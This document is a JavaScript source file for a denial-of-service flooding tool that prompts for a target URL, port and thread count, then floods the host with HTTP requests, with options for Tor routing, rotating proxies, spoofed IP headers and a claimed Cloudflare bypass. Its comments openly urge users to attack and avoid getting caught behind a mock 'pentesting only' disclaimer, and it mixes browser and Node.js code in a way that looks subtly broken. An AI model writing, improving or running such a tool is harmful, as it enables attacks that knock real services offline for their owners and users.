// ******************************************************************************
// * FUCK YEAH! THIS TOOL IS FOR PENTESTING ONLY! ILLEGAL USE IS PROHIBITED... *
// * BUT WHO GIVES A SHIT? NOODLES INC. IS NOT RESPONSIBLE FOR MISUSE. HA!    *
// * SERIOUSLY THOUGH, THIS SHIT IS DANGEROUS. DON'T BE A FUCKING MORON.       *
// ******************************************************************************

// ******************************************************************************
// * DDoS TOOL - TCP FLOOD - v7.0 - APOCALYPSE EDITION! - CLOUDFLARE BYPASS++ *
// ******************************************************************************

// Configuration - Let's fuck things up HARD!
let targetURL = prompt("Enter target URL (including http/https/onion):");
let targetHost;
try {
    targetURL = new URL(targetURL);
    targetHost = targetURL.hostname;
} catch (error) {
    alert("Invalid URL! You fucked it up!");
    window.close();
}

const port = parseInt(prompt("Enter target port (e.g., 80, 443, 8080):"));
const threads = parseInt(prompt("Enter number of threads (crank it up to 666!):"));
const duration = parseInt(prompt("Enter duration in seconds (let's go long term - FOREVER!):"));
const logFile = "ddos_fuck_log.txt"; // Log file name - keep track of the carnage
let isRunning = false; // Track attack status
let onionSupport = confirm("Do you want to enable .onion support? This requires a Tor proxy running locally. If you don't know what this is, you're fucked.");
let cloudflareBypass = confirm("Attempt Cloudflare bypass? (May not always work, you dumbass!) Using more advanced techniques now, hope you're using good proxies!");
let proxyListURL = prompt("Enter URL for proxy list (HTTP/SOCKS4/SOCKS5 - one proxy per line). Leave blank to skip and use direct connection (not recommended for Cloudflare bypass):");
let useRandomSubdomains = confirm("Use random subdomains? (Helps bypass some DDoS protection).")

// Colors (ANSI escape codes) - Make it look badass!
const darkGreen = "\x1b[32m";
const purple = "\x1b[35m";
const darkRed = "\x1b[31m";
const darkBlue = "\x1b[34m";
const darkPurple = "\x1b[38;5;54m"; // Dark Purple
const resetColor = "\x1b[0m";

// Get elements for start, stop, and timer
const startButton = document.createElement('button');
startButton.textContent = 'Start Attack';
startButton.style.backgroundColor = 'darkgreen';
startButton.style.color = 'white';
startButton.style.padding = '10px';
startButton.style.margin = '5px';
document.body.appendChild(startButton);

const stopButton = document.createElement('button');
stopButton.textContent = 'Stop Attack';
stopButton.style.backgroundColor = 'darkred';
stopButton.style.color = 'white';
stopButton.style.padding = '10px';
stopButton.style.margin = '5px';
stopButton.disabled = true; // Initially disabled
document.body.appendChild(stopButton);

const timerDisplay = document.createElement('div');
timerDisplay.textContent = 'Attack Duration: 0 seconds';
timerDisplay.style.color = 'white';
timerDisplay.style.fontFamily = 'monospace';
timerDisplay.style.margin = '5px';
document.body.appendChild(timerDisplay);

let startTime;
let timerInterval;
let proxies = []; // Store proxy list

// Logging function - gotta record the destruction!
function log(message) {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] ${message}\n`;
    console.log(`${darkGreen}[LOG] ${message}${resetColor}`);
    // Simple file logging (Node.js environment) - let's write this shit to disk
    try {
        const fs = require('fs');
        fs.appendFileSync(logFile, logEntry);
    } catch (error) {
        console.error(`${darkRed}[ERROR] Failed to write to log file: ${error}${resetColor}`);
    }
}

// Load Proxy List
async function loadProxies(url) {
    try {
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error(`Failed to fetch proxy list: ${response.status}`);
        }
        const text = await response.text();
        proxies = text.split('\n').map(p => p.trim()).filter(p => p !== '');
        log(`${darkGreen}[MAIN] Loaded ${proxies.length} proxies from ${url}${resetColor}`);
    } catch (error) {
        log(`${darkRed}[ERROR] Error loading proxies: ${error}${resetColor}`);
        proxies = []; // Reset proxies to avoid errors
    }
}

function getRandomProxy() {
    if (proxies.length === 0) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}

// Modified TCP Flood function with .onion and Cloudflare support
async function tcpFlood(threadId) {
    const net = require('net');
    const crypto = require('crypto');
    const socks = require('socks').SocksClient; // Required for .onion support
    const tls = require('tls'); // Required for TLS/SSL
    const https = require('https'); // Required for HTTPS proxy support
    const url = require('url');

    const isTor = targetURL.protocol === 'onion:';
    const isHTTPS = targetURL.protocol === 'https:';

    log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port} ${isTor ? '(via Tor)' : ''} ${cloudflareBypass ? '(attempting Cloudflare bypass)' : ''}${resetColor}`);

    while (isRunning) {
        try {
            const connect = () => {
                return new Promise((resolve, reject) => {
                    let socket;

                    if (isTor && onionSupport) {
                        const options = {
                            proxy: {
                                type: 5, // SOCKS v5
                                host: '127.0.0.1', // Tor proxy address
                                port: 9050, // Tor proxy port
                            },
                            command: 'connect',
                            destination: {
                                host: targetHost,
                                port: port,
                            },
                        };

                        socks.createConnection(options, (err, sock, info) => {
                            if (err) {
                                log(`${darkRed}[THREAD ${threadId}] SOCKS error: ${err}${resetColor}`);
                                reject(err);
                                return;
                            }

                            log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port} (via Tor)${resetColor}`);
                            resolve(sock);
                        });
                    } else if (proxies.length > 0 && cloudflareBypass) {
                        // Use a proxy from the list for Cloudflare bypass
                        const proxyString = getRandomProxy();
                        if (!proxyString) {
                            log(`${darkRed}[THREAD ${threadId}] No proxies available${resetColor}`);
                            reject(new Error("No proxies available"));
                            return;
                        }

                        // Basic proxy format: [protocol://][username:password@]host:port
                        const proxyURL = new URL(proxyString);
                        const proxyHost = proxyURL.hostname;
                        const proxyPort = parseInt(proxyURL.port);
                        const proxyProtocol = proxyURL.protocol.slice(0, -1); // Remove ':'
                        const proxyAuth = proxyURL.username && proxyURL.password ? `${proxyURL.username}:${proxyURL.password}@` : '';

                        const parsedTargetURL = url.parse(targetURL.href);
                        const options = {
                            hostname: proxyHost,
                            port: proxyPort,
                            path: parsedTargetURL.href,
                            method: 'GET',
                            headers: {
                                'Host': targetHost,
                                'User-Agent': getRandomUserAgent(),
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                                'Accept-Language': 'en-US,en;q=0.5',
                                'Accept-Encoding': 'gzip, deflate, br',
                                'Connection': 'keep-alive',
                                'Upgrade-Insecure-Requests': '1',
                                'Cache-Control': 'max-age=0',
                                'X-Forwarded-For': generateRandomIP(),
                                'X-Real-IP': generateRandomIP(),
                                'CF-Connecting-IP': generateRandomIP(),
                                'X-Flooder': crypto.randomBytes(20).toString('hex'),
                            }
                        };
                        
                        const req = https.request(options, (res) => {
                            log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port} via proxy ${proxyHost}:${proxyPort} - Status: ${res.statusCode}${resetColor}`);
                            res.on('data', () => {}); // Consume data
                            res.on('end', () => {}); // End data
                        });

                        req.on('socket', (sock) => {
                            // Set up socket timeout and error handling
                            sock.setTimeout(15000); // Adjust as needed
                            sock.on('timeout', () => {
                                log(`${darkRed}[THREAD ${threadId}] Socket timeout`);
                                req.abort();
                            });
                        });

                        req.on('error', (err) => {
                            log(`${darkRed}[THREAD ${threadId}] Proxy connection error: ${err.message}`);
                            reject(err);
                        });

                        req.end();
                        resolve(req);
                    } else {
                        if (isHTTPS) {
                            // TLS/SSL connection
                            const tlsOptions = {
                                host: targetHost,
                                port: port,
                                rejectUnauthorized: false, // Allow self-signed certificates (for testing)
                            };
                            socket = tls.connect(tlsOptions, () => {
                                log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port} (TLS)${resetColor}`);
                                resolve(socket);
                            });
                        } else {
                            // Regular TCP connection
                            socket = net.createConnection({ host: targetHost, port: port }, () => {
                                log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port}${resetColor}`);
                                resolve(socket);
                            });
                        }

                        socket.on('error', (err) => {
                            log(`${darkRed}[THREAD ${threadId}] Socket error: ${err.message}${resetColor}`);
                            reject(err);
                        });
                    }
                });
            };

            const socket = await connect();

            let intervalId = setInterval(() => {
                let payload = "GET / HTTP/1.1\r\n";
                let hostname = targetHost;

                if (useRandomSubdomains) {
                    const subdomain = crypto.randomBytes(8).toString('hex');
                    hostname = `${subdomain}.${targetHost}`;
                }
                payload += `Host: ${hostname}\r\n`;

                payload += "Connection: keep-alive\r\n";
                payload += "Cache-Control: max-age=0\r\n";
                payload += "Upgrade-Insecure-Requests: 1\r\n";

                // Cloudflare Bypass - Add some extra headers to trick their shit
                if (cloudflareBypass) {
                    payload += "X-Forwarded-For: " + generateRandomIP() + "\r\n";
                    payload += "X-Real-IP: " + generateRandomIP() + "\r\n";
                    payload += "CF-Connecting-IP: " + generateRandomIP() + "\r\n";
                }

                payload += "User-Agent: " + getRandomUserAgent() + "\r\n";
                payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n";
                payload += "Accept-Encoding: gzip, deflate, br\r\n"; // Add brotli encoding
                payload += "Accept-Language: en-US,en;q=0.9\r\n\r\n";
                payload += "X-Flooder: " + crypto.randomBytes(20).toString('hex') + "\r\n";

                try {
                    socket.write(payload);
                } catch (writeError) {
                    log(`${darkRed}[THREAD ${threadId}] Error writing to socket: ${writeError}${resetColor}`);
                    clearInterval(intervalId);
                    socket.destroy();
                }
            }, 0);

            socket.on('error', (err) => {
                log(`${darkRed}[THREAD ${threadId}] Socket error: ${err.message}${resetColor}`);
                socket.destroy();
            });

            socket.on('close', () => {
                log(`${darkBlue}[THREAD ${threadId}] Socket closed${resetColor}`);
            });

        } catch (connectError) {
            log(`${darkRed}[THREAD ${threadId}] Connection error: ${connectError}${resetColor}`);
        }
    }

    log(`${purple}[THREAD ${threadId}] TCP flood finished${resetColor}`);
}

// Helper Functions (gotta have those for the Cloudflare bypass)
function generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function getRandomUserAgent() {
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', // Added for coverage
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', // Added for coverage
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',  // Added for coverage
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0', // Added for coverage
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',  // Added for coverage
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Timer Function
function updateTimer() {
    const elapsedTime = Math.floor((Date.now() - startTime) / 1000);
    timerDisplay.textContent = `Attack Duration: ${elapsedTime} seconds`;
}

// Main execution - let's get this party started!
async function main() {
    if (proxyListURL) {
        await loadProxies(proxyListURL);
    }

    log(`${darkGreen}[MAIN] Starting DDoS attack against ${targetHost}:${port} with ${threads} threads - FUCK YEAH!${resetColor}`);
    isRunning = true;
    startTime = Date.now();
    timerInterval = setInterval(updateTimer, 1000);

    for (let i = 0; i < threads; i++) {
        tcpFlood(i + 1);
    }
}

// Add event listeners to buttons
startButton.addEventListener('click', () => {
    startButton.disabled = true;
    stopButton.disabled = false;
    main();
});

stopButton.addEventListener('click', () => {
    isRunning = false;
    clearInterval(timerInterval);
    startButton.disabled = false;
    stopButton.disabled = true;
    log(`${darkGreen}[MAIN] Attack stopped manually.${resetColor}`);
});

// Explicit user consent required - just to cover our asses (sort of)
if (confirm("WARNING: This tool is for PENTESTING purposes ONLY. Unauthorized use is ILLEGAL and will probably land your ass in jail. NOODLES INC. is NOT responsible for any misuse. We're not even a real company. Do you agree to proceed and accept the consequences like a FUCKING MAN? (LOL)")) {
    // Do nothing here; the start button triggers the attack
} else {
    window.close(); // Close the window if the user does not agree
}

// Educational Information (Can be expanded in the UI) - who gives a shit?
console.log("%c[INFO] This TCP Flood tool works by opening multiple TCP connections to the target server and sending a continuous stream of data. This can overwhelm the server and make it unavailable. - Now go fuck some shit up and don't get caught, you dumbass! We've also added some Cloudflare bypass techniques - don't expect miracles.", "color: darkblue;");

// Security Headers (Example - adapt as needed for the server environment) - yeah right, as if we care.
// This would typically be set server-side, but for demonstration:
try {
    document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">`);
} catch (e) {
    console.warn("[WARN] Could not set security headers. This is expected in some environments. - Whatever, it's all gonna burn anyway. Just like your sorry ass when you get caught!");
}

// Disclaimer for Noodles Inc.
console.warn("%c[DISCLAIMER] NOODLES INC. IS NOT RESPONSIBLE FOR YOUR SHIT. YOU FUCK IT UP, YOU OWN IT. THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. - DON'T BE A DUMBASS!", "color: darkred;");